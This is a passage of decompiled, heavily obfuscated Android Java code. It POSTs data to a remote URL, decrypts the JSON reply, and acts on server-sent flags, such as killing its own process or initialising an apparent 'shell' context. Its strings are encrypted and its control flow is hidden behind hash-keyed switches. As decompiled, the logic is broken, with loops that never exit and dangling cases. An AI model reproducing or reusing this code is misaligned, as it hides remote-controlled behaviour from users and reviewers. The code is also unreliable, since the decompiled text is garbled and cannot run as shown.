                                            str19 = zEquals2 ? "ۥ۟ۡۦۜۦۖ۟ۤ۟ۜۘ۠ۥۥۘۖۜ۬۠ۥۙ۟۬ۗۙۤۡۘۤۨۥۖۦۜۘۙۙۢۦ۬ۨۘۧۙۤۧۙۜۘ۟۠ۤۦۜۛۚۡۖۘ" : "ۧۤۤۚ۟ۥ۠ۖۚۚۙۜۜۨۦۜۘۢۚۡۦۗ۬ۢۥۙۥۘ۫۟ۖۘۢ۟ۗۨ۬۫ۗۥۚ۬ۛۘۘ۬ۤۜۜۨۘ";
                                        case 1276332821:
                                            str19 = "ۙۛۧۡ۟۫ۗۦۘۨ۠ۘۖۧ۠ۙۚۥۘۢۨۗۛۙ۫۟۬۬ۡ۟۬ۜۘۨۘۨ۬ۖ";
                                    }
                                }
                                break;
                            case 1341610018:
                                iCode = -1;
                                break;
                            case 1568809811:
                                new AtomicReference();
                                try {
                                    OkHttpClient.Builder builderConnectionSpecs = new OkHttpClient.Builder().dns(new r0(strReplace, 0)).connectionSpecs(Collections.singletonList(new ConnectionSpec.Builder(ConnectionSpec.MODERN_TLS).tlsVersions(TlsVersion.TLS_1_3, TlsVersion.TLS_1_2).cipherSuites(CipherSuite.TLS_AES_128_GCM_SHA256, CipherSuite.TLS_AES_256_GCM_SHA384, CipherSuite.TLS_CHACHA20_POLY1305_SHA256, CipherSuite.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256, CipherSuite.TLS_ECDHE_RSA_WITH_AES_128_GCM_SHA256).build()));
                                    TimeUnit timeUnit = TimeUnit.SECONDS;
                                    Response responseExecute = builderConnectionSpecs.connectTimeout(10L, timeUnit).readTimeout(10L, timeUnit).retryOnConnectionFailure(true).build().newCall(new Request.Builder().url(strReplace).post(RequestBody.create(string2, MediaType.get(l2.decrypt("8+suRAgNPLD79DAHGUMqs+W2OEcTA3Cx4Pc7RgIBOaH2\n", "kpteKGFuXcQ=\n")))).build()).execute();
                                    iCode = responseExecute.code();
                                    String str20 = "ۘۨۘۥۘۦ۠ۤ۟ۨۦۧۛ۫ۖۥۗۚۥۖۜۤۧ۬ۤۗۖۗۨۦۙ۟ۚۤۘۘۚ۟ۧ۬۬ۡۗۘۧۢۦۘۡۙۥۘۗۛۜۘ";
                                    while (true) {
                                        switch (str20.hashCode() ^ (-2083912133)) {
                                            case -1979791753:
                                                str20 = "ۘۜۥۘۚۗۙ۬۬ۜۘۤۥۙۚ۟ۡۛ۫ۥۘۛۚ۟ۡۚۥۘۢۥۡۘ۟ۜۥۘۡۖۢۨۜ۬ۘۨۧۙۧ";
                                            case -1726277544:
                                                break;
                                            case 663874056:
                                                String str21 = "ۖ۟ۘۗۖۦۘ۠ۦۚۡ۠ۨۛۧۦۨۘ۬ۛۡۦۤۚۜۘ۬ۖۙۙ۟۫ۖ۠ۧۙ۠ۦ";
                                                while (true) {
                                                    switch (str21.hashCode() ^ 1316022505) {
                                                        case -2105397130:
                                                            str20 = "ۥۦ۟ۧ۫ۖۨۢۦۜۥۜ۫ۥۦۘ۫ۤۦۘۡۢۥۘۛۙۢۦۡۚۧ۟ۥ";
                                                            break;
                                                        case -1259465207:
                                                            str20 = "ۗۖۦۘۡۙ۬ۛۧۧ۟۫ۦ۟۬ۚۡۡۙۥۜۜۘۥۦۢۛۙۢۡۦ۬ۨۨ۬ۜۢۡ۬ۘۢۥۦۨ";
                                                            break;
                                                        case 309683898:
                                                            str21 = iCode == 200 ? "ۡۧ۠ۦۤۜۘۙۧۡۘۙۨۥۥۥۚۚ۟ۗ۟۠ۖۘۘۚ۫ۛۧۥۘۡ۟ۨۥۙۨۥۘ۠ۤ۟ۜۖ۫ۜۘ۠ۛ۫ۖۤۦۘۗ۬ۗۚۘۗ" : "ۡ۬ۖۘۗۨۥۚۖۗۡۖۦۧۥۘ۟ۗۗ۟ۜۘۘۚۦۤۖۘۙ۟ۧۜۜۘۘۧۘۥ۬ۡۥۘۨۢۨۘ";
                                                        case 2096544001:
                                                            str21 = "ۙۤۨ۠ۦۤۦۦۥۜۦۖۖ۠ۤۧۛۡۘۨ۟۬ۗۜۚۖۘۧۥ۟ۖۢۗۨۢۥۙ۬ۡۛۢ۬ۖ۬۠ۚۡۛۘۘ۬ۚۘۘۛۤۙ";
                                                    }
                                                }
                                                break;
                                            case 1727603223:
                                                String str22 = "ۛۡۢۥۖ۫ۡۦۘۘۙۘۥۤ۫ۘۚ۬ۦۘۙۨۧۘۧۖۘۗ۠ۜۡ۠ۧۜۘ۠۟ۛۗ۫ۢۗۘۧۘ۠ۛۜۘۜ۬۟ۜۖۜۡۦ۬";
                                                while (true) {
                                                    try {
                                                        switch (str22.hashCode() ^ 930656086) {
                                                            case -1006410852:
                                                                str22 = "ۦۛۡۘۨۖۘۢۖۤۢۤۚۨۤۜۨۡۜۘۢۚۦ۫ۥۦۥۘۜۧۚۥۡۛۡۘۖۘۤۤۛۘۨۨۘ۫ۦۗۥۙ";
                                                            case -843421336:
                                                                sb22.append(responseExecute.body().string());
                                                                z2 = true;
                                                                i = iCode;
                                                                break;
                                                            case 821896078:
                                                                break;
                                                            case 1527269543:
                                                                String str23 = "ۥ۠ۛۘ۟ۗۤۗ۫ۡ۫ۖۘۘۘۗۙ۬ۢۙۦۥۡ۫ۢۜۧۜۨۤۖۥۗۥۘۧۘۧ";
                                                                while (true) {
                                                                    switch (str23.hashCode() ^ (-1993210746)) {
                                                                        case -1440020477:
                                                                            str22 = "ۖ۫ۡ۬ۜۤۦۤۢۥۜۜۘۤۤۥۘ۫ۖۚۦۘ۠ۙ۫ۦۘ۟۬۬ۛۘۛ۠ۙۘۦۖۢۨۢۖۙۧ۫";
                                                                            break;
                                                                        case -643063910:
                                                                            str23 = responseExecute.body() != null ? "۬ۘۥۘ۠ۨۘۘۗۧۥۦۚ۫ۖۖۥ۠ۛۘۘۛۚۦۘ۬ۘ۫ۥۥۖ۬ۘۖۜۖ۫ۛ۬ۖ" : "ۛۢۦۘۘۚۜۤ۫ۚۡۨۦۘۛۗۗۖۛۧۤۤۢۖۘۗ۬ۚ۫ۧۡۘۦۖ۠ۗ۬ۖۘۦ۠۬ۥۙ۟ۚۛۡۦۘۧۘۘۥۤۡۦۘ";
                                                                        case 1331012985:
                                                                            str23 = "ۘۡۖۢۨۛۚ۬۠ۜۘۤۥ۫ۨۖۦ۬ۘ۟ۙۥۘ۟ۙۤۨۖۘۗۜۡۘۛۙۢۢۥۖۢۧۢ۫ۗۤۦۙۦۘۥۘۡۛ۠ۗ";
                                                                        case 1850132318:
                                                                            str22 = "ۨۦۘ۬ۛ۫ۤۢۡۘۜۗ۠ۡ۟ۡۘۛۗۤۖۚۤ۬ۗۖۢۖ۬ۧۖ۠ۡۜۖۗۙۜۘۙۧۥۘۜ۠ۖۡۢۤ۠ۘۨۘ";
                                                                            break;
                                                                    }
                                                                }
                                                                break;
                                                        }
                                                    } catch (Exception e4) {
                                                        e = e4;
                                                        e.printStackTrace();
                                                        k2.logToFloatingWindow(l2.decrypt("yOy5ioszwDscRFvCwyyqTSMVDNOudZonaRpSjZAK\n", "jKLqYiyQJqU=\n") + e.getMessage(), l2.decrypt("xCT96Zg=\n", "oVaPhurHAvQ=\n"));
                                                        iArr3[0] = iArr3[0] + 1;
                                                        z2 = false;
                                                        i = iCode;
                                                        str5 = "ۚۢۥۖۤۦۘۗۥۘۘۧۙۦۘ۟ۖۜ۫۟ۖۘۨۢۜۘۖ۟ۧ۫۬ۢۖ";
                                                        while (true) {
                                                            switch (str5.hashCode() ^ 1020671572) {
                                                                case -1531959834:
                                                                    break;
                                                                case -1378289403:
                                                                    break;
                                                                case -550707592:
                                                                    break;
                                                                case 1513907418:
                                                                    break;
                                                            }
                                                        }
                                                        str6 = "ۖۡۧۘۤۥۜ۠ۛۜۦۖۢۡۡۘ۫ۘۘۘۧۥ۫۬۫ۗۧ۠ۦۘۧۦۧۘ۟ۧۚ۫ۡۨۘۗ۠ۥۘۦۙۤ";
                                                        while (true) {
                                                            switch (str6.hashCode() ^ (-1165819036)) {
                                                                case -704160080:
                                                                    break;
                                                                case -687582756:
                                                                    break;
                                                                case -85272491:
                                                                    break;
                                                                case -20826937:
                                                                    break;
                                                            }
                                                        }
                                                        str2 = "ۛۨۢ۟ۥ۫ۨۗ۬ۦۖۘۖۡۨۘ۟ۖۖۥۨۨۘۦۚۘۘ۫ۤۡۘۡ۬ۦۜ۫۬ۙۧۡۘ";
                                                        while (true) {
                                                            switch (str2.hashCode() ^ (-296637591)) {
                                                                case -2051262072:
                                                                    break;
                                                                case -660958403:
                                                                    break;
                                                                case -203741106:
                                                                    break;
                                                                case 750215639:
                                                                    break;
                                                            }
                                                        }
                                                        Thread.sleep(1000L);
                                                    }
                                                }
                                                break;
                                        }
                                    }
                                } catch (Exception e5) {
                                    e = e5;
                                    iCode = -1;
                                }
                                break;
                        }
                    }
                    str5 = "ۚۢۥۖۤۦۘۗۥۘۘۧۙۦۘ۟ۖۜ۫۟ۖۘۨۢۜۘۖ۟ۧ۫۬ۢۖ";
                    while (true) {
                        switch (str5.hashCode() ^ 1020671572) {
                            case -1531959834:
                                break;
                            case -1378289403:
                                String str24 = "ۢ۟ۜ۬ۦۧۧۛۥۦۢۨۘۧۙۖۗۘۤۛۨۖۚ۠۠ۚۤۚۗۜۜۦۗۦ۠۠ۢۢۚۤ۠ۚ۫ۧۚۗۦۗ";
                                while (true) {
                                    switch (str24.hashCode() ^ 222066112) {
                                        case -488310435:
                                            str24 = !z2 ? "ۙۦۘ۫ۖۥۢ۬ۨۙۥۖۙۦۙۙۢۤۖۧۡۘ۫ۗۛۗۦۙۚۦۨۘۛۜۨۡۗۛۥۙۖۘۜۥۧ" : "ۤۙۛۥۢۜۘۚۦۧۘ۫ۥۜ۫ۡۨۘۖۧۧۥۢۧۤ۠ۖۚ۟ۜۘۡۨۜۘ۟ۚۙۢۨۛۘۧۘۘۙۡۘۚۤۚۤۤۦۘ۬ۙ۟";
                                        case -407575789:
                                            str5 = "۠ۘ۠ۤۧۧۤ۟ۧۤ۠ۢۛۧۖۨ۟۟۠ۨۖۥۤۚۦۗۨۤۗۗۖۦۖۘۖۡۥۨۗۘۘۨ۫ۖۘۗۥ۟ۧۗۚۙۤۖۘ۠ۚۜ";
                                            break;
                                        case 528069116:
                                            str5 = "ۜۙ۠ۡ۬ۘۘۥۧ۬ۦۖ۠۟ۜ۟ۦۡۖۡۢۙۢ۫ۥۘۘۖۤۖۧۘۡۨۡ";
                                            break;
                                        case 1585210721:
                                            str24 = "ۥۘۛۦ۟۬۟۠ۦۘ۬ۚۦ۬ۧۦۘۘۚۦۘۜۥ۟۬ۙۡۘۥۢۦۤۤ۬ۢ۬ۥ۬۬ۥۘۖۙۥۘۛۡۜ۠ۡۘۘۚۘ";
                                    }
                                }
                                break;
                            case -550707592:
                                try {
                                    k2.logToFloatingWindow(l2.decrypt("Nf4tSaA9DLpFqRgIYda26XL2UB2nfk2gOP05\n", "3UG2rCWY5QE=\n"), l2.decrypt("qMx+cg==\n", "waIYHZAcdXk=\n"));
                                    HttpURLConnection httpURLConnection = (HttpURLConnection) new URL(strReplace).openConnection();
                                    httpURLConnection.setRequestMethod(l2.decrypt("TOHB2w==\n", "HK6Sjy35j8k=\n"));
                                    httpURLConnection.setConnectTimeout(10000);
                                    httpURLConnection.setReadTimeout(10000);
                                    httpURLConnection.setDoOutput(true);
                                    httpURLConnection.setRequestProperty(l2.decrypt("L6VsLq9FRCo4s3I/\n", "bMoCWsorMAc=\n"), l2.decrypt("Zg6mEzeCgeluEbhQJsyX6nBTsBAsjM3odRKzET2OhPhj\n", "B37Wf17h4J0=\n"));
                                    BufferedOutputStream bufferedOutputStream = new BufferedOutputStream(httpURLConnection.getOutputStream());
                                    bufferedOutputStream.write(string2.getBytes());
                                    bufferedOutputStream.flush();
                                    bufferedOutputStream.close();
                                    int responseCode = httpURLConnection.getResponseCode();
                                    String str25 = "۬ۡۘۡۤۖۤۦۘۜ۠۟ۚۢۖۨۗۘۘۡۗۗۚۗۤۢۘۖۘۥۗۨۘ۬ۗۖۘۥۗۜۛۥۥۘ۟ۘۚ";
                                    while (true) {
                                        switch (str25.hashCode() ^ (-1124177961)) {
                                            case -1719267949:
                                                System.out.println(l2.decrypt("mL+D99IgHgz+2omL\n", "fzU1EVKh+aw=\n") + responseCode + l2.decrypt("NTz1Va91XqyX9Gk/5XoA\n", "FRHVvQDCuB0=\n"));
                                                break;
                                            case -749242919:
                                                try {
                                                    System.out.println(l2.decrypt("Y3enFJCe4JIFEq1o\n", "hP0R8hAfBzI=\n") + responseCode + l2.decrypt("kLa/yJWQMiYyfTKD359s\n", "sJufIDon1Jc=\n"));
                                                    BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(httpURLConnection.getInputStream()));
                                                    while (true) {
                                                        String line = bufferedReader.readLine();
                                                        String str26 = "ۖۜۧۡۡۦۘۦۙۚۥۦ۠ۨۘۢ۟ۗۜ۬ۤۡۘۨۡ۫ۧۢۚۙۤۡۙۥۘۢۧۦۘۚۖۘۘ۫ۦۘۧ۬۟ۦ۫ۜ";
                                                        while (true) {
                                                            switch (str26.hashCode() ^ (-428406193)) {
                                                                case -1817435304:
                                                                    str26 = "ۦ۬ۨۘۙۨۘۤۜۙۥۖۨۘۦۤۧ۫ۦ۟۫ۦۢ۫ۜۛۛۜۗۤ۫ۘۧۗۢ۫ۛۜۘ۟ۢۦۘۛۖۥ";
                                                                case -802036860:
                                                                    break;
                                                                case 849261008:
                                                                    break;
                                                                case 1641277527:
                                                                    String str27 = "ۦۗۤ۫۫ۤۚۡۡۘ۟ۖۛۡۜۘۘۙۢۨۘ۬ۘۦۥ۟ۥۗۗۘ۬ۡۙ۫ۧۨۜ۬ۛ";
                                                                    while (true) {
                                                                        switch (str27.hashCode() ^ (-1851614891)) {
                                                                            case -1628977760:
                                                                                str27 = "ۖۘۙۚۖۖۘۧۜۛۖۗۢۙۖۡۘ۠ۧۖۢۛۦۘۘۧۦۘۥۨ۠ۡۜۡۘۖ۫ۦۘ۟ۚۘۘۛ۠ۜ۫ۡۨۧ۫۠ۤ۬ۧۤۜۛۧۦ۫";
                                                                            case 693544266:
                                                                                str26 = "ۡ۫ۜۘ۟ۡۘ۬ۤۛۦۘۙۚۦۘۥۢ۠ۘۤۗ۫ۚ۟۠ۙۗ۫ۨۧ۬ۖۘ۟ۧۥ";
                                                                                break;
                                                                            case 1642192532:
                                                                                str26 = "۫ۛۜۧ۬ۥۢ۠ۡۦۙۦ۠ۤۡۘۛۙۜۘۨۡ۟ۧ۟ۜۘ۬ۢۚۘۚۥۤۢۖۨۙ۠";
                                                                                break;
                                                                            case 1926631536:
                                                                                str27 = line != null ? "ۛۧۜۤۦۘۡۜۙۛۡۡۧ۫ۤ۫ۚۡۘۚۜ۠ۙ۬ۜۢۗۨۘۖۡۡۘ" : "۫۬ۡۘۤ۟ۡۘ۬ۚۚۜۢۚۛ۫ۜ۟ۜ۬ۖۚ۠ۜۚ۫ۚۗۨ۟ۧ۠۠ۗۡۘۢۤۙۚۚۦۤۧۨ۠ۛ۟۟۟۟ۨ۟ۚۤۗۥ";
                                                                        }
                                                                    }
                                                                    break;
                                                            }
                                                            bufferedReader.close();
                                                            break;
                                                        }
                                                        sb22.append(line);
                                                    }
                                                } catch (Exception e6) {
                                                    e = e6;
                                                    i = responseCode;
                                                    try {
                                                        k2.logToFloatingWindow(l2.decrypt("LZ0xwMlGgGBzwBiqgl7qKnyeRpT9\n", "xCapKGfiaM8=\n") + e.getMessage() + l2.decrypt("zCLHsK3uGQSYaO3wweJdRrww\n", "KYBZVSdO/KA=\n"), l2.decrypt("dkIBJLE=\n", "EzBzS8Mqnhk=\n"));
                                                        str6 = "ۖۡۧۘۤۥۜ۠ۛۜۦۖۢۡۡۘ۫ۘۘۘۧۥ۫۬۫ۗۧ۠ۦۘۧۦۧۘ۟ۧۚ۫ۡۨۘۗ۠ۥۘۦۙۤ";
                                                        while (true) {
                                                            switch (str6.hashCode() ^ (-1165819036)) {
                                                                case -704160080:
                                                                    break;
                                                                case -687582756:
                                                                    break;
                                                                case -85272491:
                                                                    break;
                                                                case -20826937:
                                                                    break;
                                                            }
                                                        }
                                                    } catch (Exception e7) {
                                                        e = e7;
                                                        iArr3[0] = iArr3[0] + 1;
                                                        k2.logToFloatingWindow(h.d("qfKD5+uhOZjNi5G4m7hG\n", "T24pAHQE3CQ=\n", new StringBuilder(), e), l2.decrypt("vlLPCf8=\n", "2yC9Zo0+phA=\n"));
                                                        str7 = str8;
                                                        str2 = "ۛۨۢ۟ۥ۫ۨۗ۬ۦۖۘۖۡۨۘ۟ۖۖۥۨۨۘۦۚۘۘ۫ۤۡۘۡ۬ۦۜ۫۬ۙۧۡۘ";
                                                        while (true) {
                                                            switch (str2.hashCode() ^ (-296637591)) {
                                                                case -2051262072:
                                                                    break;
                                                                case -660958403:
                                                                    break;
                                                                case -203741106:
                                                                    break;
                                                                case 750215639:
                                                                    break;
                                                            }
                                                        }
                                                        Thread.sleep(1000L);
                                                    }
                                                    str2 = "ۛۨۢ۟ۥ۫ۨۗ۬ۦۖۘۖۡۨۘ۟ۖۖۥۨۨۘۦۚۘۘ۫ۤۡۘۡ۬ۦۜ۫۬ۙۧۡۘ";
                                                    while (true) {
                                                        switch (str2.hashCode() ^ (-296637591)) {
                                                            case -2051262072:
                                                                break;
                                                            case -660958403:
                                                                break;
                                                            case -203741106:
                                                                break;
                                                            case 750215639:
                                                                break;
                                                        }
                                                    }
                                                    Thread.sleep(1000L);
                                                }
                                                break;
                                            case -667875833:
                                                str25 = "۠ۘ۫ۙ۟۬ۗۘۖۧۨۨۜ۟ۤۛۚۢۘۗۢ۫۟ۛ۬ۙۤۤۜۦۘۖۗۤ۟۠ۜ";
                                            case 200874552:
                                                String str28 = "ۦۧ۠ۢۖۡۘۤ۟ۤۙ۫ۨۘۘۚۙۤۧۧۛ۟ۨۘۢۧۧۢۛۨۘ۠۠ۨۘۚۘۨۘۘ۬ۙۦۘۧۦۛۥۢۥۦۜۤۡۜۖۧۘۥۚۨ";
                                                while (true) {
                                                    switch (str28.hashCode() ^ (-400878545)) {
                                                        case -649091767:
                                                            str28 = "ۖۙۙۤۨۗۨۖۡۡۖۥ۠ۖۦۘۧ۬۠۟ۨۧۦۘۤۙ۫ۡۘۜۛۦۘۚۡۛۥۡۥۜۡۨ۠۫ۛۥۢۡ۠۬ۧۜۡ۫ۡ۬ۧ";
                                                        case -582536871:
                                                            str25 = "ۖۜۜۘ۫ۢۡۘۢۧۡۘۥۘۛۨ۬۠ۛۦۧۘۚۗۜۛۧۜۘۚ۠ۤۦۤۦۜۛۡ۬ۡۧ۬ۥۖۘۙۗۨۘۛ۟ۨۙۛۨ";
                                                            break;
                                                        case -412066388:
                                                            str25 = "ۙۤۢۘ۠ۚۘۛۢۘۖۙ۠ۥۜ۠ۨۦۘۥۖۘ۠ۢۘۘۦۡۚۜۛۛ۟۬۬ۗۚۛۖۚۡۤۜ۠ۙۚۥۘ";
                                                            break;
                                                        case 1797366582:
                                                            str28 = responseCode == 200 ? "ۘۦۖۨۤ۠ۙۘۤۘۡۖۘۤۢ۬ۡ۠ۖۨۦۦۖۥۥۛۥۘۢۜۦۘۙۖۡۤ۫ۥۙۛ۠ۜۙۘۘۘ۟ۡ۠ۗۘۘۤۤ۫ۢۜ" : "ۡۜۗۦۛۨۘۥ۬ۛۥۢۨۨ۟ۦ۬ۡۡۘۙۗۥۘ۫۫ۘۘۤ۟ۙۚۛۘۘۗۡۦۜ۫ۗ۬۫ۘۘۜۨۜۘۧۖ۬ۗۥۘۜۘۘ۬ۘ۠";
                                                    }
                                                }
                                                break;
                                        }
                                    }
                                    httpURLConnection.disconnect();
                                    i = responseCode;
                                } catch (Exception e8) {
                                    e = e8;
                                }
                                break;
                            case 1513907418:
                                str5 = "۫ۚۘۛۤۡۘۜۜۖۘ۬ۘ۬ۜۗۘۘۜۗۘۘۖۖۜۗۢۛۡۥۗۖۥۤۚۥ۬ۜ۟۬ۖۙۜۘۡۦ۟ۘۘۢۥۤۛ";
                        }
                    }
                    str6 = "ۖۡۧۘۤۥۜ۠ۛۜۦۖۢۡۡۘ۫ۘۘۘۧۥ۫۬۫ۗۧ۠ۦۘۧۦۧۘ۟ۧۚ۫ۡۨۘۗ۠ۥۘۦۙۤ";
                    while (true) {
                        switch (str6.hashCode() ^ (-1165819036)) {
                            case -704160080:
                                k2.logToFloatingWindow(l2.decrypt("FG1+WjlI8SZsJ0MjqKl4ypn/+4y4\n", "/MLJvIjKF64=\n"), l2.decrypt("Z0U=\n", "CC70dVuLqYw=\n"));
                                jSONObject = new JSONObject(decrypt(sb22.toString(), l2.decrypt("fO0w6m1zKE1072K8OyF6Ew==\n", "Td8D3lhFH3U=\n")));
                                boolean zOptBoolean = jSONObject.optBoolean(l2.decrypt("PsbbZX1tew==\n", "UaC9CRQDHr0=\n"), false);
                                String str29 = "ۨۜۘ۟ۨۨ۬ۤۨۨ۟ۙۢ۠ۥۛۚۥۢ۫ۖۘۧۢۗۙۥۘۖ۬ۥۧۛ۬ۤۖۧ۠ۢۗۢۦۦۘۘۚۦ۬ۚۨۘۡ۬ۜۡۨۥۘ";
                                while (true) {
                                    switch (str29.hashCode() ^ 1366457033) {
                                        case -2007319844:
                                            str29 = "ۛۥۜۘۤ۟ۥۘۧ۬ۜۘۛۢۢۗ۟ۛۦۖۢ۫ۨۤ۠ۦۘۘ۟۬ۚۥۤۗۧۚۧۜۤ";
                                        case -1515126048:
                                            System.out.println(l2.decrypt("+aTwByPNRxWc7f1MeeUidpma\n", "EQpA4pxLrpA=\n"));
                                            Utils.shellSP_write(context, l2.decrypt("iN1kDu9f\n", "67IKaIY4CCo=\n"), sb22.toString());
                                            break;
                                        case 496314598:
                                            String str30 = "ۧ۟ۖۦۚۘۖۜۧۘۡۥ۠۬ۘۖۘۚۡ۫ۥۚۡۥۢۨۛۡۧۢۨۡۘۛۨۡۘۜۧۜۘ";
                                            while (true) {
                                                switch (str30.hashCode() ^ 1284134497) {
                                                    case -1333146952:
                                                        str29 = "ۚۘۙ۠ۨۗۗۖۡۘۘۡۧۘۧۥۜ۫ۘۘۖۙۦۘۙۧۙۡۖۥ۫ۧۦۘۧ۟ۜ۟ۚۡۦۛۙۙۧۧۥۥۘۙۜۥۘ۫ۘۘۥۛۦۘ";
                                                        break;
                                                    case -1298096627:
                                                        str29 = "ۥ۠ۛ۫ۛۘ۬۫ۥۘۘۖۦ۫ۦ۠ۚۖۡۥۘۡ۫۫ۛۙۛۘۨۚ۠ۡۙۜۚۨۖۨ۟ۨۚۜۧ";
                                                        break;
                                                    case 135317462:
                                                        str30 = "ۗۜۚۦۘۥۢ۫ۨ۟ۡۥۘۘۢۖۘۘۢۧ۠ۘۜۛۦ۫ۡ۬ۦۛۡۖۧۚۛۘۥۡۛۦ۠ۡ۠ۖۛۘ۟ۦۗ";
                                                    case 665695986:
                                                        str30 = zOptBoolean ? "ۖۖۗۥۘۧۡۚ۫ۖۙ۫۟ۜ۫ۘۨ۠ۤ۬ۨۘۘۜۘۥۨۘۧ۠ۖۘ۫ۥۖۘۨۛ۠ۜۦۨۜۜۢۖۨۥۥ۬ۥ" : "ۛۜۡۘۥۡۢۦۢۦۗۢۛۦۗۨ۬ۨۘۘۜۧۤۥۢۨۘ۬۠ۡۙۛۜۖۡ۫ۚۤ۬۠ۧۦۢ۠ۤ۠ۥۜۦۜۜ";
                                                }
                                            }
                                            break;
                                        case 1718288194:
                                            System.out.println(l2.decrypt("09Wocusav0i2nKU5siTTKpLB\n", "O3sYl1ScVs0=\n"));
                                            Utils.shellSP_write(context, l2.decrypt("UjTFXiLs\n", "MVurOEuLNM0=\n"), null);
                                            break;
                                    }
                                }
                                boolean zOptBoolean2 = jSONObject.optBoolean(l2.decrypt("MxwadYRT9Q==\n", "V3VpFOY/kAw=\n"), false);
                                String str31 = "۫ۖۤۚۘۖۘۘۙۨۘۧۧۜۘۦۙۨۥۤۜۚ۠ۨۘۤ۬ۨۨۜۥۤ۬ۡۥۧۘۥ۬ۙۚۙۖ۟ۡۥۚۖۘۤ۟ۡۘۗۙۤ۠۫ۛ";
                                while (true) {
                                    switch (str31.hashCode() ^ (-87951710)) {
                                        case -1736759310:
                                            String str32 = "ۥۙۥۘۚۙۙ۫ۦۗۨ۟۠ۛ۠ۨۡۙۡۖۧ۟ۦ۠ۨۘۧۙۖۙۨ۟ۚ۟ۛ۫ۙۙ";
                                            while (true) {
                                                switch (str32.hashCode() ^ (-1551169047)) {
                                                    case -12885583:
                                                        str31 = "ۚۗۚۥۤۨۦۦۥ۠ۨۨۤۦۘۧۡ۟ۡۨۤۡۤۥۘۗۘۧۗ۫ۨ";
                                                        break;
                                                    case 433543074:
                                                        str32 = "۟ۘۜۨۧۦۘۧ۠۟ۤ۫ۛۘۘۧۨ۬ۡۘۧۛۡۥۥۧۘ۟ۨۙۗۚۡۨۘ۠ۤ";
                                                    case 983233850:
                                                        str32 = zOptBoolean2 ? "ۦۖۖۘۜۦۘۘۛۡۥ۟ۗۙۛۧۧۡۙۛۙۡۢۖۦۡ۬۠۬ۨۢ۠" : "ۜۢ۫ۗ۬ۗۧ۬ۚۙۡۜۨۗۧۢۨۗۧ۬ۙ۫ۖۗۜۛۖۖۤ";
                                                    case 1761266185:
                                                        str31 = "ۘ۠ۘۘۨۙۢۥۤ۬ۧۚۖۘۢۦۥۘۚۖۜۚۦۨۗۖۘۘۡۛۦ۬ۢۢۥ۫۟ۡۥۦۙۙۨ۟۫";
                                                        break;
                                                }
                                            }
                                            break;
                                        case -140293391:
                                            Process.killProcess(Process.myPid());
                                            return;
                                        case 674134953:
                                            boolean zOptBoolean3 = jSONObject.optBoolean(l2.decrypt("kDJaNB77JpqaNw==\n", "9Vw7VnKebvU=\n"), false);
                                            String str33 = "۠ۡۚۘۙۛۦۡۦۘ۬ۢۖۨ۟ۨ۟ۙ۟ۡۜۘۘۙۖۢ۫ۜۢۘۜۥۥۘۘۤۥۨۥۥۧۥۨۘۘ۫ۨۜۘۚۘۗۘۜ۟ۖ۟۟";
                                            while (true) {
                                                switch (str33.hashCode() ^ 870192622) {
                                                    case -1421161806:
                                                        k2.logToFloatingWindow(l2.decrypt("YspNqXBksH4rHogjpwHfcWzVWmApYeYHEPgC4VsC3khi3k2pRnu9bTmyX8Epa/oJEP4=\n", "hFbnTMzkVe4=\n"), null);
                                                        break;
                                                    case -1122638436:
                                                        str33 = "ۤۚ۠ۥۘ۟۫ۙ۟۫۫ۢۡۧۘۘۚۢۨۘۖۜۢۖۧۧۤۢۧۛۥۜۥۙۙۦۢۡۤۜۛۜۛۛ۬ۛۚۤۧۦۘ";
                                                    case 507613469:
                                                        o.init(VfSEUCNxUWTV.getShellContextThis());
                                                        break;
                                                    case 1107870761:
                                                        String str34 = "۟ۤۘۥۜ۟ۙۦ۬ۖ۟ۤۡۗۦۛ۠ۤ۫۟ۧۛۗۗۚۧۦۥ۠۟۠ۜ۫ۦۦ۠ۨ۫ۡۢ۬ۚۖ۠ۧۦۗ۟ۥۥۘۘ۟ۜۘ";
                                                        while (true) {
                                                            switch (str34.hashCode() ^ (-2132022349)) {
                                                                case -1961736311:
                                                                    str33 = "ۗ۫ۨ۬ۛۦ۟۟ۜۘ۬۟ۡۘۖ۟ۡۘۦۗۘۘ۬ۡۘۡۚۖۡ۟ۜۘۙ۫ۜۘ";
                                                                    break;
                                                                case -1920026726:
                                                                    str34 = "ۗۧۥۦۙۥۘ۫ۚۡۘۢۧۡۘۤ۫ۘۘۥۘۢۡۙۘۖۖۘۧۖۢۖۗۖۘ";
                                                                case -1291919456:
                                                                    str33 = "ۧۛۛۘ۬۫ۛۙ۠ۧ۬ۜۚۨۘۤۧ۟ۖۚۜۤۤ۠۟ۖۜۥۙۥۘ۠ۖۚۜۖۡ۟ۨۨۨۡۚ";
                                                                    break;
                                                                case 2054005607:
                                                                    str34 = zOptBoolean3 ? "ۥۙۙۚۢۡۘ۟ۖۛۛۚۨۨ۟ۧۙ۫۟۠ۛۤۨۗۤۛۜۖۘۤۧۢ۬ۨ۬ۥۨۜۘ۫ۛۦ۬ۙۡۤۦۜۡۧۦ" : "ۨۖۢۧۚ۬ۦۘۘۥ۠ۙ۟۟۫ۛۛۨ۟ۨۡۘۢۖۥ۫ۚۖۘۦۥۤۦۘۥۗۤۙۢۨۖ";
                                                            }
                                                        }
                                                        break;
                                                }
                                            }
                                            boolean zOptBoolean4 = jSONObject.optBoolean(l2.decrypt("uA4haOt4ETm5CSFs5Q==\n", "2mJAC4AnYVg=\n"), false);
                                            JSONArray jSONArrayOptJSONArray2 = jSONObject.optJSONArray(l2.decrypt("uyWETgTC8X++H4NwBcXxe7Afn3gV2g==\n", "1UDzEWaukBw=\n"));
                                            String str35 = "ۚۥۜۨۗۗۢ۫ۧۤۥۥۡۚۧۦ۬ۗۤۤ۟۬ۧۡ۬۠ۥۘۦۚۡۨۛ۫ۛۢۥۘ";
                                            while (true) {
                                                switch (str35.hashCode() ^ 1976609680) {
                                                    case -590189239:
                                                        str35 = "ۘۙۜۘۤۨۘۢ۟ۙۨۦۘۦۡۘۜۚ۟ۢ۟ۘۥۗۙۚۘ۟۟ۗۢۖۛۧۚۛۜۖۘۗ۬۬ۙۢۥۘۥۗۜ";
                                                    case -561256592:
                                                        break;
                                                    case -164357008:
                                                        String str36 = "ۖۗ۠۟ۖ۠ۘۥۨۡۧۚۖۤ۬ۜ۬۬ۛۧۤ۠۬۠ۢۦۙۘۦۡۦۦۨۖۗۖ";
                                                        while (true) {
                                                            switch (str36.hashCode() ^ (-1454938300)) {
                                                                case -1055546322:
